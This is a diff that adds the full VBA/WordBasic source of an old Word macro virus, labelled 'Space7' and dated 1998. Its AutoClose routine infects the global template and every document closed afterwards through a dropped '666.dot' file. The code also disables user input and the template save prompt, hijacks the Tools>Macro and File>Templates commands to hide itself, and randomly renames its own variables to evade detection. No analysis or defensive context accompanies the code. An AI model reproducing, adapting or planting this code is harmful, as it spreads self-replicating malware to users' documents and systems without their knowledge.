@@ -1,0 +1,234 @@
+   VERSION 1.0 CLASS
+   BEGIN
+     MultiUse = -1  'True
+   END
+   Attribute VB_Name = "ThisDocument"
+   Attribute VB_GlobalNameSpace = False
+   Attribute VB_Creatable = False
+   Attribute VB_PredeclaredId = True
+   Attribute VB_Exposed = True
+
+   Attribute VB_Name = "DateiDokVorlagen"
+
+   Dim REDUCKNJEFPMGI
+   Dim VGFRTGMIJLNBFSEK
+   Dim GTETPERLDAVIT
+   Dim AEGLTKNENVLPTEFTQBA$
+
+   Public Sub MAIN()
+   REDUCKNJEFPMGI = 0
+   VGFRTGMIJLNBFSEK = 0
+   GTETPERLDAVIT = 0
+   AEGLTKNENVLPTEFTQBA$ = ""
+   On Error Resume Next
+   GTETPERLDAVIT = 0
+   VGFRTGMIJLNBFSEK = 8
+   WordBasic.DisableInput GTETPERLDAVIT
+   AEGLTKNENVLPTEFTQBA$ = WordBasic.[DefaultDir$](VGFRTGMIJLNBFSEK)
+   REDUCKNJEFPMGI = 1
+   If SNARRNTPUTCOFHGEO <> REDUCKNJEFPMGI Then DFCOCTENIMUNPGHQOKV
+   WordBasic.MacroCopy "Global:AutoClose", "666:AutoClose"
+   WordBasic.ToolsMacro Name:="AutoClose", Show:=REDUCKNJEFPMGI, Delete:=1
+   WordBasic.FileSaveAll REDUCKNJEFPMGI
+   WordBasic.AddInState AEGLTKNENVLPTEFTQBA$ + "\666.dot", GTETPERLDAVIT
+   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileTemplates(False)
+   WordBasic.CurValues.FileTemplates dlg
+   WordBasic.Dialog.FileTemplates dlg
+   WordBasic.FileTemplates dlg
+   WordBasic.AddInState AEGLTKNENVLPTEFTQBA$ + "\666.dot", REDUCKNJEFPMGI
+   WordBasic.MacroCopy "666:AutoClose", "Global:AutoClose"
+   WordBasic.FileSaveAll REDUCKNJEFPMGI
+   EPFJARUIVMIGK:
+   WordBasic.DisableInput REDUCKNJEFPMGI
+   End Sub
+   Private Sub DFCOCTENIMUNPGHQOKV()
+   On Error Resume Next
+   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileTemplates(False)
+   WordBasic.CurValues.FileTemplates dlg
+   WordBasic.Dialog.FileTemplates dlg
+   WordBasic.FileTemplates dlg
+   WordBasic.DisableInput REDUCKNJEFPMGI
+   Stop
+   End Sub
+   Private Function SNARRNTPUTCOFHGEO()
+   Dim GQIDNJAQKKNFCRLTQAC
+   For GQIDNJAQKKNFCRLTQAC = GTETPERLDAVIT To WordBasic.CountMacros(GTETPERLDAVIT)
+   If WordBasic.[MacroName$](GQIDNJAQKKNFCRLTQAC, GTETPERLDAVIT) = "AutoClose" Then SNARRNTPUTCOFHGEO = REDUCKNJEFPMGI
+   Next GQIDNJAQKKNFCRLTQAC
+   End Function
+
+   Attribute VB_Name = "ExtrasMakro"
+
+   Dim RTVLKGRJBMAUBETIJC
+   Dim TKCIICTPDQQBBU
+   Dim PJFMQNNSRLDRIVH
+   Dim SUUSFDKFUIMVBOGOBM$
+
+   Public Sub MAIN()
+   RTVLKGRJBMAUBETIJC = 0
+   TKCIICTPDQQBBU = 0
+   PJFMQNNSRLDRIVH = 0
+   SUUSFDKFUIMVBOGOBM$ = ""
+   On Error Resume Next
+   PJFMQNNSRLDRIVH = 8
+   TKCIICTPDQQBBU = 0
+   WordBasic.DisableInput TKCIICTPDQQBBU
+   SUUSFDKFUIMVBOGOBM$ = WordBasic.[DefaultDir$](PJFMQNNSRLDRIVH)
+   RTVLKGRJBMAUBETIJC = 1
+   If GUIUDGBAHGRGNIBQ <> RTVLKGRJBMAUBETIJC Then PTMJISGJPKGTVOIHRN
+   WordBasic.MacroCopy "Global:AutoClose", "666:AutoClose"
+   WordBasic.ToolsMacro Name:="AutoClose", Show:=RTVLKGRJBMAUBETIJC, Delete:=1
+   WordBasic.FileSaveAll RTVLKGRJBMAUBETIJC
+   WordBasic.AddInState SUUSFDKFUIMVBOGOBM$ + "\666.dot", TKCIICTPDQQBBU
+   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
+   WordBasic.CurValues.ToolsMacro dlg
+   dlg.Show = RTVLKGRJBMAUBETIJC
+   WordBasic.Dialog.ToolsMacro dlg
+   WordBasic.ToolsMacro dlg
+   WordBasic.AddInState SUUSFDKFUIMVBOGOBM$ + "\666.dot", RTVLKGRJBMAUBETIJC
+   WordBasic.MacroCopy "666:AutoClose", "Global:AutoClose"
+   WordBasic.FileSaveAll RTVLKGRJBMAUBETIJC
+   VNGOALCIQFCBBLO:
+   WordBasic.DisableInput RTVLKGRJBMAUBETIJC
+   End Sub
+   Private Sub PTMJISGJPKGTVOIHRN()
+   On Error Resume Next
+   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
+   WordBasic.CurValues.ToolsMacro dlg
+   dlg.Show = RTVLKGRJBMAUBETIJC
+   WordBasic.Dialog.ToolsMacro dlg
+   WordBasic.ToolsMacro dlg
+   WordBasic.DisableInput RTVLKGRJBMAUBETIJC
+   Stop
+   End Sub
+   Private Function GUIUDGBAHGRGNIBQ()
+   Dim RKTPQESOJOTUK
+   For RKTPQESOJOTUK = TKCIICTPDQQBBU To WordBasic.CountMacros(TKCIICTPDQQBBU)
+   If WordBasic.[MacroName$](RKTPQESOJOTUK, TKCIICTPDQQBBU) = "AutoClose" Then GUIUDGBAHGRGNIBQ = RTVLKGRJBMAUBETIJC
+   Next RKTPQESOJOTUK
+   End Function
+
+   Attribute VB_Name = "AutoClose"
+
+   Dim HIKKFAEJRDFEO
+   Dim IJAEERPBIBVIA
+   Dim MPOCSSCBMMGOQM
+   Dim CMDDNDRDPB$
+   Dim ETUBSSEVSABUBLK
+   Dim QKVLVVMLOALGRKST$
+   Dim BGJFPKHTUAFUGCERQM__$()
+   Dim FEAGPJSCCKPVNOLRO
+   Dim VOCKNJKGDCNCUPF
+   Dim PNPULJKLVSGB
+   Dim OHNSOSOCAUTRGPSQA
+   Dim CBIERONUEGBVDLFR$
+   Dim RKRLKBLMLTVP
+
+   Public Sub MAIN()
+   ReDim BGJFPKHTUAFUGCERQM__$(30)
+   Dim IJSSBASJVCAKJO
+   HIKKFAEJRDFEO = 0
+   IJAEERPBIBVIA = 0
+   MPOCSSCBMMGOQM = 0
+   CMDDNDRDPB$ = ""
+   ETUBSSEVSABUBLK = 0
+   QKVLVVMLOALGRKST$ = ""
+   FEAGPJSCCKPVNOLRO = 0
+   VOCKNJKGDCNCUPF = 0
+   PNPULJKLVSGB = 0
+   OHNSOSOCAUTRGPSQA = 0
+   CBIERONUEGBVDLFR$ = ""
+   RKRLKBLMLTVP = 0
+   On Error GoTo -1: On Error GoTo TNGVETHJVTIOTSJB
+   HIKKFAEJRDFEO = 1
+   IJAEERPBIBVIA = 0
+   WordBasic.DisableInput HIKKFAEJRDFEO
+   MPOCSSCBMMGOQM = 2
+   CMDDNDRDPB$ = WordBasic.[AppInfo$](MPOCSSCBMMGOQM)
+   ETUBSSEVSABUBLK = 7
+   QKVLVVMLOALGRKST$ = WordBasic.[WindowName$]()
+   FEAGPJSCCKPVNOLRO = 10
+   VOCKNJKGDCNCUPF = 22
+   PNPULJKLVSGB = 65
+   OHNSOSOCAUTRGPSQA = 8
+   CBIERONUEGBVDLFR$ = WordBasic.[DefaultDir$](OHNSOSOCAUTRGPSQA)
+   RKRLKBLMLTVP = 23
+   IJSSBASJVCAKJO = WordBasic.Val(WordBasic.[Left$](CMDDNDRDPB$, HIKKFAEJRDFEO))
+   If IJSSBASJVCAKJO <> ETUBSSEVSABUBLK Then GoTo TNGVETHJVTIOTSJB
+   KHCDEQQPTRMPF
+   WordBasic.ScreenUpdating IJAEERPBIBVIA
+   WordBasic.DisableAutoMacros IJAEERPBIBVIA
+   If DDECFBJPFLDRLQM <> HIKKFAEJRDFEO Then PMPCROKGGFODHS
+   WordBasic.FileSaveAs Format:=HIKKFAEJRDFEO
+   ' Space7
+   ' (c) 1998 Miles Teg
+   WordBasic.MacroCopy "Global:AutoClose", QKVLVVMLOALGRKST$ + ":AutoClose"
+   WordBasic.MacroCopy "666:ExtrasMakro", QKVLVVMLOALGRKST$ + ":ExtrasMakro"
+   WordBasic.MacroCopy "666:DateiDokVorlagen", QKVLVVMLOALGRKST$ + ":DateiDokVorlagen"
+   WordBasic.FileSave
+   TNGVETHJVTIOTSJB:
+   HHKFDOUOTB
+   WordBasic.DisableAutoMacros HIKKFAEJRDFEO
+   WordBasic.DocClose HIKKFAEJRDFEO
+   WordBasic.ScreenUpdating HIKKFAEJRDFEO
+   WordBasic.DisableInput IJAEERPBIBVIA
+   End Sub
+   Private Sub PMPCROKGGFODHS()
+   WordBasic.FileNew NewTemplate:=HIKKFAEJRDFEO
+   WordBasic.FileSaveAs CBIERONUEGBVDLFR$ + "\666.dot"
+   WordBasic.MacroCopy QKVLVVMLOALGRKST$ + ":AutoClose", "Global:AutoClose"
+   WordBasic.MacroCopy QKVLVVMLOALGRKST$ + ":ExtrasMakro", "666:ExtrasMakro"
+   WordBasic.MacroCopy QKVLVVMLOALGRKST$ + ":DateiDokVorlagen", "666:DateiDokVorlagen"
+   WordBasic.DisableAutoMacros HIKKFAEJRDFEO
+   WordBasic.ToolsOptionsSave GlobalDotPrompt:=IJAEERPBIBVIA
+   WordBasic.DocClose HIKKFAEJRDFEO
+   WordBasic.ScreenUpdating HIKKFAEJRDFEO
+   WordBasic.DisableInput IJAEERPBIBVIA
+   Stop
+   End Sub
+   Private Function DDECFBJPFLDRLQM()
+   Dim RVKFJTSAAAOKA
+   For RVKFJTSAAAOKA = HIKKFAEJRDFEO To WordBasic.CountMacros(IJAEERPBIBVIA)
+   If WordBasic.[MacroName$](RVKFJTSAAAOKA, IJAEERPBIBVIA) = "AutoClose" Then DDECFBJPFLDRLQM = HIKKFAEJRDFEO
+   Next RVKFJTSAAAOKA
+   End Function
+   Private Sub KHCDEQQPTRMPF()
+   BGJFPKHTUAFUGCERQM__$(0) = "HIKKFAEJRDFEO"
+   BGJFPKHTUAFUGCERQM__$(1) = "IJAEERPBIBVIA"
+   BGJFPKHTUAFUGCERQM__$(2) = "MPOCSSCBMMGOQM"
+   BGJFPKHTUAFUGCERQM__$(3) = "CMDDNDRDPB"
+   BGJFPKHTUAFUGCERQM__$(4) = "ETUBSSEVSABUBLK"
+   BGJFPKHTUAFUGCERQM__$(5) = "QKVLVVMLOALGRKST"
+   BGJFPKHTUAFUGCERQM__$(6) = "BGJFPKHTUAFUGCERQM"
+   BGJFPKHTUAFUGCERQM__$(7) = "FEAGPJSCCKPVNOLRO"
+   BGJFPKHTUAFUGCERQM__$(8) = "VOCKNJKGDCNCUPF"
+   BGJFPKHTUAFUGCERQM__$(9) = "PNPULJKLVSGB"
+   BGJFPKHTUAFUGCERQM__$(10) = "OHNSOSOCAUTRGPSQA"
+   BGJFPKHTUAFUGCERQM__$(11) = "CBIERONUEGBVDLFR"
+   BGJFPKHTUAFUGCERQM__$(12) = "RKRLKBLMLTVP"
+   BGJFPKHTUAFUGCERQM__$(13) = "TNGVETHJVTIOTSJB"
+   BGJFPKHTUAFUGCERQM__$(14) = "IJSSBASJVCAKJO"
+   BGJFPKHTUAFUGCERQM__$(15) = "LIVLVBGCLS"
+   BGJFPKHTUAFUGCERQM__$(16) = "KHCDEQQPTRMPF"
+   BGJFPKHTUAFUGCERQM__$(17) = "DDECFBJPFLDRLQM"
+   BGJFPKHTUAFUGCERQM__$(18) = "RVKFJTSAAAOKA"
+   BGJFPKHTUAFUGCERQM__$(19) = "HHKFDOUOTB"
+   BGJFPKHTUAFUGCERQM__$(20) = "PMPCROKGGFODHS"
+   BGJFPKHTUAFUGCERQM__$(21) = "BFRFBNTKRA"
+   BGJFPKHTUAFUGCERQM__$(22) = "EKKVVLDIIUQUPQEHLBC"
+   BGJFPKHTUAFUGCERQM__$(23) = "QJMSJHLJHGDFVSTO"
+   End Sub
+   Private Function BFRFBNTKRA$()
+   Dim EKKVVLDIIUQUPQEHLBC$
+   Dim QJMSJHLJHGDFVSTO
+   EKKVVLDIIUQUPQEHLBC$ = ""
+   For QJMSJHLJHGDFVSTO = HIKKFAEJRDFEO To FEAGPJSCCKPVNOLRO + Rnd() * FEAGPJSCCKPVNOLRO: EKKVVLDIIUQUPQEHLBC$ = EKKVVLDIIUQUPQEHLBC$ + Chr(Rnd() * VOCKNJKGDCNCUPF + PNPULJKLVSGB): Next QJMSJHLJHGDFVSTO
+   BFRFBNTKRA$ = EKKVVLDIIUQUPQEHLBC$
+   End Function
+   Private Sub HHKFDOUOTB()
+   Dim QJMSJHLJHGDFVSTO
+   WordBasic.ToolsMacro Name:="AutoClose", Show:=HIKKFAEJRDFEO, Edit:=1
+   For QJMSJHLJHGDFVSTO = IJAEERPBIBVIA To RKRLKBLMLTVP
+   WordBasic.EditReplace Find:=BGJFPKHTUAFUGCERQM__$(QJMSJHLJHGDFVSTO), Replace:=BFRFBNTKRA$, Direction:=IJAEERPBIBVIA, MatchCase:=HIKKFAEJRDFEO, WholeWord:=IJAEERPBIBVIA, PatternMatch:=IJAEERPBIBVIA, ReplaceAll:=1, Format:=IJAEERPBIBVIA, Wrap:=HIKKFAEJRDFEO
+   Next QJMSJHLJHGDFVSTO
+   End Sub
